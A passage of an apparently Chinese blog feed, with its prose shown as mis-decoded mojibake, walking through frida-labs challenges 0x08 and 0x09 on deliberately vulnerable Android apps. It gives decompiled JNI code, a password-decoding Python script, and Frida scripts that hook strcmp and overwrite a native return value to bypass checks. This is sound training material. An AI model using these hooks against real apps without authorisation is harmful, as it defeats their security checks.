href="https://www.youtube.com/watch?v=fTGTnrgjuGA">https://www.youtube.com/watch?v=fTGTnrgjuGA</a></p><p>1ã€å°†æ–‡ä»¶å¯¼å…¥ï¼Œå•å‡» <code>Yes</code> å¹¶ç­‰å¾…åˆ†æå®Œæˆã€‚</p><p>ç‚¹å‡»ExportæŸ¥çœ‹å¯¼å‡ºå‡½æ•°ï¼Œæ‰¾åˆ°äº†<code>cmpstr</code> å‡½æ•°ï¼š</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407281148827.png" alt="image.png"> </p><p>2ã€è¿™æ—¶å€™å¯ä»¥çœ‹åˆ°å¯¹åº”çš„æ±‡ç¼–å’Œåæ±‡ç¼–ä»£ç äº†ï¼Œä»£ç èƒ½åŠ›ä¸è¡Œï¼Œç›´æ¥AIå³å¯</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">bool</span> <span class="title function_">Java_com_ad2001_frida0x8_MainActivity_cmpstr</span><span class="params">(_JNIEnv **env, undefined8 param_2, undefined8 str)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> iVar1;</span><br><span class="line">  <span class="type">char</span> *__s1;</span><br><span class="line">  ulong uVar2;</span><br><span class="line">  <span class="type">long</span> lVar3;</span><br><span class="line">  <span class="type">long</span> in_FS_OFFSET;</span><br><span class="line">  <span class="type">int</span> local_c4;</span><br><span class="line">  <span class="type">char</span> local_78 [<span class="number">104</span>];</span><br><span class="line">  <span class="type">long</span> local_10;</span><br><span class="line">  </span><br><span class="line">  local_10 = *(<span class="type">long</span> *)(in_FS_OFFSET + <span class="number">0x28</span>); <span class="comment">// ä¿å­˜ä¸€ä¸ªå®‰å…¨æ£€æŸ¥çš„å€¼ï¼Œç”¨äºæ£€æµ‹æ ˆæº¢å‡º</span></span><br><span class="line">  __s1 = (<span class="type">char</span> *)_JNIEnv::GetStringUTFChars(*env, str, <span class="number">0</span>); <span class="comment">// ä»JNIç¯å¢ƒè·å–Javaå­—ç¬¦ä¸²çš„UTF-8è¡¨ç¤º</span></span><br><span class="line">  local_c4 = <span class="number">0</span>; <span class="comment">// åˆå§‹åŒ–å¾ªç¯è®¡æ•°å™¨</span></span><br><span class="line">  <span class="keyword">while</span>( <span class="literal">true</span> ) &#123; <span class="comment">// æ— é™å¾ªç¯</span></span><br><span class="line">    uVar2 = __strlen_chk(<span class="string">&quot;GSJEB|OBUJWF`MBOE~&quot;</span>, <span class="number">0xffffffffffffffff</span>); <span class="comment">// è·å–ä¸€ä¸ªç¡¬ç¼–ç å­—ç¬¦ä¸²çš„é•¿åº¦</span></span><br><span class="line">    <span class="keyword">if</span> (uVar2 &lt;= (ulong)(<span class="type">long</span>)local_c4) <span class="keyword">break</span>; <span class="comment">// å¦‚æœå·²ç»å¤åˆ¶äº†æ‰€æœ‰å­—ç¬¦ï¼Œåˆ™é€€å‡ºå¾ªç¯</span></span><br><span class="line">    local_78[local_c4] = <span class="string">&quot;GSJEB|OBUJWF`MBOE~&quot;</span>[local_c4] + <span class="number">-1</span>; <span class="comment">// å°†ç¡¬ç¼–ç å­—ç¬¦ä¸²çš„æ¯ä¸ªå­—ç¬¦å‡1åå¤åˆ¶åˆ°local_78æ•°ç»„</span></span><br><span class="line">    local_c4 = local_c4 + <span class="number">1</span>; <span class="comment">// å¢åŠ è®¡æ•°å™¨</span></span><br><span class="line">  &#125;</span><br><span class="line">  lVar3 = __strlen_chk(<span class="string">&quot;GSJEB|OBUJWF`MBOE~&quot;</span>, <span class="number">0xffffffffffffffff</span>); <span class="comment">// å†æ¬¡è·å–ç¡¬ç¼–ç å­—ç¬¦ä¸²çš„é•¿åº¦</span></span><br><span class="line">  local_78[lVar3] = <span class="string">&#x27;\0&#x27;</span>; <span class="comment">// åœ¨å­—ç¬¦ä¸²æœ«å°¾æ·»åŠ ç©ºå­—ç¬¦ä»¥ç»“æŸå­—ç¬¦ä¸²</span></span><br><span class="line">  iVar1 = <span class="built_in">strcmp</span>(__s1, local_78); <span class="comment">// æ¯”è¾ƒè¾“å…¥çš„å­—ç¬¦ä¸²å’Œè½¬æ¢åçš„ç¡¬ç¼–ç å­—ç¬¦ä¸²</span></span><br><span class="line">  __android_log_print(<span class="number">3</span>, <span class="string">&quot;input &quot;</span>, &amp;DAT_001006b0, __s1); <span class="comment">// å°†è¾“å…¥çš„å­—ç¬¦ä¸²è®°å½•åˆ°Androidæ—¥å¿—</span></span><br><span class="line">  __android_log_print(<span class="number">3</span>, <span class="string">&quot;Password&quot;</span>, &amp;DAT_001006b0, local_78); <span class="comment">// å°†è½¬æ¢åçš„å­—ç¬¦ä¸²è®°å½•åˆ°Androidæ—¥å¿—</span></span><br><span class="line">  _JNIEnv::ReleaseStringUTFChars(*env, str, __s1); <span class="comment">// é‡Šæ”¾JNIå­—ç¬¦ä¸²èµ„æº</span></span><br><span class="line">  <span class="keyword">if</span> (*(<span class="type">long</span> *)(in_FS_OFFSET + <span class="number">0x28</span>) == local_10) &#123; <span class="comment">// æ£€æŸ¥æ ˆæ˜¯å¦æº¢å‡º</span></span><br><span class="line">    <span class="keyword">return</span> iVar1 == <span class="number">0</span>; <span class="comment">// å¦‚æœå­—ç¬¦ä¸²åŒ¹é…ï¼Œè¿”å›trueï¼Œå¦åˆ™è¿”å›false</span></span><br><span class="line">  &#125;</span><br><span class="line">                    <span class="comment">/* WARNING: Subroutine does not return */</span></span><br><span class="line">  __stack_chk_fail(); <span class="comment">// å¦‚æœæ£€æµ‹åˆ°æ ˆæº¢å‡ºï¼Œåˆ™è°ƒç”¨å¤±è´¥å¤„ç†å‡½æ•°</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç®€è€Œè¨€ä¹‹ï¼Œè¿™ä¸ªå‡½æ•°çš„ä½œç”¨æ˜¯ï¼š</p><ol><li>ä»JNIç¯å¢ƒè·å–ä¸€ä¸ªJavaå­—ç¬¦ä¸²çš„UTF-8è¡¨ç¤ºã€‚</li><li>å°†ä¸€ä¸ªç¡¬ç¼–ç çš„å­—ç¬¦ä¸²æ¯ä¸ªå­—ç¬¦å‡1åå­˜å‚¨åˆ°æœ¬åœ°æ•°ç»„ã€‚</li><li>æ¯”è¾ƒè¾“å…¥çš„å­—ç¬¦ä¸²å’Œè½¬æ¢åçš„å­—ç¬¦ä¸²ã€‚</li><li>å°†è¾“å…¥çš„å­—ç¬¦ä¸²å’Œè½¬æ¢åçš„å­—ç¬¦ä¸²è®°å½•åˆ°Androidæ—¥å¿—ã€‚</li><li>é‡Šæ”¾JNIå­—ç¬¦ä¸²èµ„æºã€‚</li><li>å¦‚æœæ£€æµ‹åˆ°æ ˆæº¢å‡ºï¼Œåˆ™è°ƒç”¨å¤±è´¥å¤„ç†å‡½æ•°ã€‚</li></ol><p>è¿”å›å€¼æ˜¯å¸ƒå°”ç±»å‹ï¼Œå¦‚æœè¾“å…¥çš„å­—ç¬¦ä¸²å’Œè½¬æ¢åçš„å­—ç¬¦ä¸²åŒ¹é…ï¼Œåˆ™è¿”å›<code>true</code>ï¼Œå¦åˆ™è¿”å›<code>false</code>ã€‚è¿™é‡Œçš„å­—ç¬¦ä¸²æ¯”è¾ƒçœ‹èµ·æ¥åƒæ˜¯ä¸€ç§ç®€å•çš„åŠ å¯†æˆ–ç¼–ç è¿‡ç¨‹ï¼Œå…¶ä¸­ç¡¬ç¼–ç çš„å­—ç¬¦ä¸²è¢«æ¯ä¸ªå­—ç¬¦å‡1åç”¨äºæ¯”è¾ƒã€‚</p><p>3ã€ä¸‹é¢æä¾›æœ¬æœºå‡½æ•°çš„æºä»£ç ä»¥ä¾¿äºè§£é‡Šã€‚</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;jni.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;android/log.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span></span><br><span class="line">JNIEXPORT jint JNICALL</span><br><span class="line"><span class="title function_">Java_com_ad2001_frida0x8_MainActivity_cmpstr</span><span class="params">(JNIEnv *env, jobject thiz, jstring str)</span> &#123;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *inputStr = env-&gt;GetStringUTFChars(str, <span class="number">0</span>);</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *hardcoded = <span class="string">&quot;GSJEB|OBUJWF`MBOE~&quot;</span>;</span><br><span class="line">    <span class="type">char</span> password[<span class="number">100</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(hardcoded) ; i++) &#123;</span><br><span class="line"></span><br><span class="line">        password[i] = (<span class="type">char</span>)(hardcoded[i] - <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    password[<span class="built_in">strlen</span>(hardcoded)] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">    <span class="type">int</span> result = <span class="built_in">strcmp</span>(inputStr, password);</span><br><span class="line">    __android_log_print(ANDROID_LOG_DEBUG, <span class="string">&quot;input &quot;</span>, <span class="string">&quot;%s&quot;</span>,inputStr);</span><br><span class="line">    __android_log_print(ANDROID_LOG_DEBUG, <span class="string">&quot;Password&quot;</span>, <span class="string">&quot;%s&quot;</span>,password);</span><br><span class="line">    env-&gt;ReleaseStringUTFChars(str, inputStr);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Returning result: 1 if equal, 0 if not equal</span></span><br><span class="line">    <span class="keyword">return</span> (result == <span class="number">0</span>) ? <span class="number">1</span> : <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸‹é¢é’ˆå¯¹ä»£ç é€å¥è§£é‡Šä¸‹ï¼š</p><p>è¿™å£°æ˜äº†ä¸€ä¸ªåä¸º <code>cmpstr</code> çš„ JNIï¼ˆJava æœ¬æœºæ¥å£ï¼‰å‡½æ•°ã€‚å®ƒä» Java ä»£ç  ( <code>Java_com_ad2001_frida0x8_MainActivity_cmpstr</code> ) ä¸­è°ƒç”¨ã€‚</p><p>æœ‰ä¸‰ä¸ªå‚æ•°ï¼š <code>env</code> è¡¨ç¤º JNI ç¯å¢ƒï¼Œ <code>thiz</code> è¡¨ç¤º Java å¯¹è±¡ï¼Œ <code>str</code> è¡¨ç¤º Java å­—ç¬¦ä¸²ã€‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">extern &quot;C&quot; JNIEXPORT jint JNICALL</span><br><span class="line">Java_com_ad2001_frida0x8_MainActivity_cmpstr(JNIEnv *env, jobject thiz, jstring str)</span><br></pre></td></tr></table></figure><p>ä» Java å­—ç¬¦ä¸² ( <code>jstring</code> ) æ£€ç´¢è¾“å…¥å­—ç¬¦ä¸²å¹¶å°†å…¶è½¬æ¢ä¸º c æ ·å¼å­—ç¬¦ä¸² ( <code>const char*</code> )ã€‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">const char *inputStr = env-&gt;GetStringUTFChars(str, 0);</span><br></pre></td></tr></table></figure><p>å˜é‡ <code>hardcoded</code> åŒ…å«ä¸€ä¸ªç¡¬ç¼–ç å€¼ï¼Œå¹¶ä¸”è¿˜å£°æ˜äº†ä¸€ä¸ªæ•°ç»„ <code>password</code> ã€‚</p><p>è¯¥å¾ªç¯é€šè¿‡å‡ 1 æ¥è½¬æ¢ <code>hardcoded</code> ä¸­çš„æ¯ä¸ªå­—ç¬¦ï¼Œå¹¶å°†ç»“æœå­˜å‚¨åœ¨ <code>password</code> æ•°ç»„ä¸­ã€‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">const char *hardcoded = &quot;GSJEB|OBUJWF`MBOE~&quot;;</span><br><span class="line">char password[100];</span><br><span class="line">for (int i = 0; i &lt; strlen(hardcoded); i++) &#123;</span><br><span class="line">    password[i] = (char)(hardcoded[i] - 1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨ <code>strcmp</code> å°†ç”¨æˆ·è¾“å…¥ ( <code>inputStr</code> ) ä¸è°ƒæ•´åçš„å¯†ç  ( <code>password</code> ) è¿›è¡Œæ¯”è¾ƒã€‚</p><p>ç»“æœå­˜å‚¨åœ¨å˜é‡ <code>result</code> ä¸­ã€‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int result = strcmp(inputStr, password);</span><br></pre></td></tr></table></figure><p>é‡Šæ”¾ä¸è¾“å…¥å­—ç¬¦ä¸²å…³è”çš„èµ„æºã€‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">env-&gt;ReleaseStringUTFChars(str, inputStr);</span><br></pre></td></tr></table></figure><p>å¦‚æœå­—ç¬¦ä¸²ç›¸ç­‰åˆ™è¿”å› 1ï¼Œå¦‚æœä¸ç›¸ç­‰åˆ™è¿”å› 0ã€‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">return (result == 0) ? 1 : 0;</span><br></pre></td></tr></table></figure><p>4ã€æ‰€ä»¥ï¼Œè¿™å—è¦å¾—åˆ°ç”¨æˆ·æ­£ç¡®çš„è¾“å…¥ï¼Œæœ‰ä¸¤ç§åŠæ³•ï¼š</p><ul><li>æ–¹æ³•ä¸€ï¼šå†™è„šæœ¬ï¼Œå¯¹ç¡¬ç¼–ç å­—ç¬¦ä¸²è¿›è¡Œå¾ªç¯æ“ä½œåï¼Œå¾—åˆ°æ­£ç¡®è¾“å…¥</li><li>æ–¹æ³•äºŒï¼šç›´æ¥hookå‡½æ•° strcmp ï¼Œè·å–å®ƒçš„ç¬¬äºŒä¸ªå‚æ•°ï¼Œå¾—åˆ°æ­£ç¡®è¾“å…¥</li></ul><h2 id="æ–¹æ³•ä¸€ï¼šPythonè„šæœ¬"><a href="#æ–¹æ³•ä¸€ï¼šPythonè„šæœ¬" class="headerlink" title="æ–¹æ³•ä¸€ï¼šPythonè„šæœ¬"></a>æ–¹æ³•ä¸€ï¼šPythonè„šæœ¬</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">str1 = <span class="string">&quot;GSJEB|OBUJWF`MBOE~&quot;</span></span><br><span class="line">str2 = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(str1)):</span><br><span class="line">    s = <span class="built_in">chr</span>(<span class="built_in">ord</span>(str1[i]) - <span class="number">1</span>)</span><br><span class="line">    str2 = str2+s</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(str2)</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407281155859.png" alt="image.png"> </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407281155109.png" alt="image.png"> </p><h2 id="æ–¹æ³•äºŒï¼šhookå‡½æ•°-strcmp"><a href="#æ–¹æ³•äºŒï¼šhookå‡½æ•°-strcmp" class="headerlink" title="æ–¹æ³•äºŒï¼šhookå‡½æ•° strcmp"></a>æ–¹æ³•äºŒï¼šhookå‡½æ•° strcmp</h2><h3 id="å¸¸è§APIä»‹ç»"><a href="#å¸¸è§APIä»‹ç»" class="headerlink" title="å¸¸è§APIä»‹ç»"></a>å¸¸è§APIä»‹ç»</h3><p>è¦Hook Nativeå±‚çš„å‡½æ•°ï¼Œæœ‰å¯¹åº”çš„Frida APIï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(targetAddress, &#123;</span><br><span class="line">    <span class="attr">onEnter</span>: <span class="keyword">function</span> (<span class="params">args</span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Entering &#x27;</span> + functionName);</span><br><span class="line">        <span class="comment">// Modify or log arguments if needed</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">onLeave</span>: <span class="keyword">function</span> (<span class="params">retval</span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Leaving &#x27;</span> + functionName);</span><br><span class="line">        <span class="comment">// Modify or log return value if needed</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p><code>Interceptor.attach</code> ï¼šå°†å›è°ƒé™„åŠ åˆ°æŒ‡å®šçš„å‡½æ•°åœ°å€ã€‚ <code>targetAddress</code> åº”è¯¥æ˜¯æˆ‘ä»¬è¦æŒ‚é’©çš„æœ¬æœºå‡½æ•°çš„åœ°å€ã€‚</p><p><code>onEnter</code> ï¼šè¿›å…¥æŒ‚é’©å‡½æ•°æ—¶è°ƒç”¨æ­¤å›è°ƒã€‚å®ƒæä¾›å¯¹å‡½æ•°å‚æ•°ï¼ˆ <code>args</code> ï¼‰çš„è®¿é—®ã€‚</p><p><code>onLeave</code> ï¼šå½“æŒ‚é’©å‡½æ•°å³å°†é€€å‡ºæ—¶è°ƒç”¨æ­¤å›è°ƒã€‚å®ƒæä¾›å¯¹è¿”å›å€¼ ( <code>retval</code> ) çš„è®¿é—®ã€‚</p><p>åŒæ—¶ï¼Œè·å–Nativeä¸­ç‰¹å®šå‡½æ•°çš„åœ°å€ï¼Œä¹Ÿå¯ä»¥è°ƒç”¨Frida APIï¼š</p><h4 id="ï¼ˆ1ï¼‰Module-enumerateExports"><a href="#ï¼ˆ1ï¼‰Module-enumerateExports" class="headerlink" title="ï¼ˆ1ï¼‰Module.enumerateExports()"></a>ï¼ˆ1ï¼‰<strong>Module.enumerateExports()</strong></h4><p>è·å– <code>libfrida0x8.so</code> çš„æ‰€æœ‰å¯¼å‡ºå‡½æ•°</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407281157472.png" alt="image.png"> </p><h4 id="ï¼ˆ2ï¼‰Module-getExportByName"><a href="#ï¼ˆ2ï¼‰Module-getExportByName" class="headerlink" title="ï¼ˆ2ï¼‰Module.getExportByName()"></a>ï¼ˆ2ï¼‰<strong>Module.getExportByName()</strong></h4><p>å‡½æ•°ä»æ¨¡å—ï¼ˆå…±äº«åº“ï¼‰ä¸­æ£€ç´¢å…·æœ‰ç»™å®šåç§°çš„å¯¼å‡ºç¬¦å·çš„åœ°å€</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407281157230.png" alt="image.png"> </p><h4 id="ï¼ˆ3ï¼‰Module-findExportByName"><a href="#ï¼ˆ3ï¼‰Module-findExportByName" class="headerlink" title="ï¼ˆ3ï¼‰Module.findExportByName()"></a>ï¼ˆ3ï¼‰<strong>Module.findExportByName()</strong></h4><p>å®ƒä¸ <code>Module.getExportByName()</code> ç›¸åŒã€‚å”¯ä¸€çš„åŒºåˆ«æ˜¯ï¼Œå¦‚æœæœªæ‰¾åˆ°å¯¼å‡ºï¼Œ <code>Module.getExportByName()</code> ä¼šå¼•å‘å¼‚å¸¸ï¼Œè€Œå¦‚æœæœªæ‰¾åˆ°å¯¼å‡ºï¼Œ <code>Module.findExportByName()</code> å°†è¿”å› <code>null</code> ã€‚</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407281158978.png" alt="image.png"> </p><h4 id="ï¼ˆ4ï¼‰Module-getBaseAddress"><a href="#ï¼ˆ4ï¼‰Module-getBaseAddress" class="headerlink" title="ï¼ˆ4ï¼‰Module.getBaseAddress()"></a>ï¼ˆ4ï¼‰<strong>Module.getBaseAddress()</strong></h4><p>æœ‰æ—¶ï¼Œå¦‚æœä¸Šè¿° API ä¸èµ·ä½œç”¨ï¼Œæˆ‘ä»¬å¯ä»¥ä¾é  <code>Module.getBaseAddress()</code> ï¼Œè¯¥ API è¿”å›ç»™å®šæ¨¡å—çš„åŸºåœ°å€ã€‚è®©æˆ‘ä»¬æ‰¾åˆ° <code>libfrida0x8.so</code> åº“çš„åŸºåœ°å€ã€‚</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407281158970.png" alt="image.png"> </p><p>å¦‚æœæˆ‘ä»¬æƒ³æ‰¾åˆ°ç‰¹å®šå‡½æ•°çš„åœ°å€ï¼Œæˆ‘ä»¬åªéœ€æ·»åŠ åç§»é‡å³å¯ã€‚ä¸ºäº†æ‰¾åˆ°åç§»é‡ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ ghidraã€‚æˆ‘ä»¬ç”¨è¿™ç§æ–¹å¼æ‰¾åˆ° <code>cmpstr</code> çš„åœ°å€ã€‚</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407281159786.png" alt="image.png"> </p><p>åç§»é‡ä¸º <code>0x8c0</code> ã€‚ å°† <code>0x8c0</code> æ·»åŠ åˆ° <code>0x7f59bbbf6000</code> å¾—åˆ° <code>0x7f59bbbf68c0</code> ã€‚</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407281159711.png" alt="img"> </p><h4 id="ï¼ˆ5ï¼‰Module-enumerateImports"><a href="#ï¼ˆ5ï¼‰Module-enumerateImports" class="headerlink" title="ï¼ˆ5ï¼‰Module.enumerateImports()"></a>ï¼ˆ5ï¼‰<strong>Module.enumerateImports()</strong></h4><p>æšä¸¾å…¨éƒ¨çš„å¯¼å…¥å‡½æ•°</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407281159428.png" alt="image.png"> </p><h3 id="Hookæ“ä½œ"><a href="#Hookæ“ä½œ" class="headerlink" title="Hookæ“ä½œ"></a>Hookæ“ä½œ</h3><p>é€šè¿‡Module.enumerateImports()å¯ä»¥æšä¸¾å…¨éƒ¨çš„å¯¼å…¥å‡½æ•°ï¼Œåœ¨é‡Œé¢å¯ä»¥çœ‹åˆ°<code>strcmp</code> å‡½æ•°</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407281159569.png" alt="img"> </p><p>ä¸‹é¢å¼€å§‹å†™è„šæœ¬å¦‚ä¸‹ï¼š</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> strcmp_adr = <span class="title class_">Module</span>.<span class="title function_">findExportByName</span>(<span class="string">&quot;libc.so&quot;</span>, <span class="string">&quot;strcmp&quot;</span>);</span><br><span class="line"><span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(strcmp_adr, &#123;</span><br><span class="line">    <span class="attr">onEnter</span>: <span class="keyword">function</span> (<span class="params">args</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> arg0 = <span class="title class_">Memory</span>.<span class="title function_">readUtf8String</span>(args[<span class="number">0</span>]); <span class="comment">// first argument</span></span><br><span class="line">        <span class="keyword">var</span> flag = <span class="title class_">Memory</span>.<span class="title function_">readUtf8String</span>(args[<span class="number">1</span>]); <span class="comment">// second argument</span></span><br><span class="line">        <span class="keyword">if</span> (arg0.<span class="title function_">includes</span>(<span class="string">&quot;Hello&quot;</span>)) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Hookin the strcmp function&quot;</span>);</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Input &quot;</span> + arg0);</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;The flag is &quot;</span>+ flag);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">onLeave</span>: <span class="keyword">function</span> (<span class="params">retval</span>) &#123;</span><br><span class="line">        <span class="comment">// Modify or log return value if needed</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407281159597.png" alt="img"> </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407281200207.png" alt="image.png"> </p><h1 id="challenge-0x09"><a href="#challenge-0x09" class="headerlink" title="challenge 0x09"></a>challenge 0x09</h1><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407281608125.png" alt="image.png"> </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407281608480.png" alt="image.png"> </p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> &#123;</span><br><span class="line">    System.loadLibrary(<span class="string">&quot;a0x9&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View v)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (MainActivity.<span class="built_in">this</span>.check_flag() == <span class="number">1337</span>) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Cipher</span> <span class="variable">cipher</span> <span class="operator">=</span> Cipher.getInstance(<span class="string">&quot;AES&quot;</span>);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                cipher.init(<span class="number">2</span>, <span class="keyword">new</span> <span class="title class_">SecretKeySpec</span>(<span class="string">&quot;3000300030003003&quot;</span>.getBytes(), <span class="string">&quot;AES&quot;</span>));</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    Toast.makeText(MainActivity.<span class="built_in">this</span>.getApplicationContext(), <span class="string">&quot;You won &quot;</span> + <span class="keyword">new</span> <span class="title class_">String</span>(cipher.doFinal(Base64.getDecoder().decode(<span class="string">&quot;hBCKKAqgxVhJMVTQS8JADelBUPUPyDiyO9dLSS3zho0=&quot;</span>))), <span class="number">1</span>).show();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>JNIå‡½æ•°åä¸ºï¼šJava_com_ad2001_a0x9_MainActivity_check_1flag</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407281608915.png" alt="image.png"> </p><p>è¿™å—å‡½æ•°é»˜è®¤è¿”å›å€¼ä¸º1ï¼Œä½†æ˜¯åœ¨javaå±‚ä¸­è¦æ±‚è¿”å›å€¼ä¸º 1337ï¼Œæ‰ä¼šç»§ç»­å‘ä¸‹æ‰§è¡Œã€‚è¿™å—ç›´æ¥hookå‡½æ•°è¿”å›å€¼ä¸º1337å³å¯ï¼š</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> check_flag = <span class="title class_">Module</span>.<span class="title function_">enumerateExports</span>(<span class="string">&quot;liba0x9.so&quot;</span>)[<span class="number">0</span>][<span class="string">&#x27;address&#x27;</span>];</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;check_flag: &quot;</span> + check_flag);</span><br><span class="line">    <span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(check_flag, &#123;</span><br><span class="line">      <span class="attr">onEnter</span>: <span class="keyword">function</span>(<span class="params">args</span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;check_flag called&quot;</span>);</span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="attr">onLeave</span>: <span class="keyword">function</span>(<span class="params">retval</span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;check_flag returned: &quot;</span> + retval);</span><br><span class="line">        retval.<span class="title function_">replace</span>(<span class="number">1337</span>);  <span class="comment">//ã€æ³¨æ„ã€‘è¿™å—éœ€è¦ä½¿ç”¨retval.replaceæ¥ä¿®æ”¹è¿”å›å€¼</span></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;check_flag returned: &quot;</span> + retval);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">setImmediate</span>(main);</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407281609189.png" alt="image.png"> </p>]]></content>
      
      
      <categories>
          
          <category> æ¸—é€æµ‹è¯• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> frida-labs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>frida-labs(1)</title>
      <link href="/2024/07/27/frida-labs(1)/"/>
      <url>/2024/07/27/frida-labs(1)/</url>
      
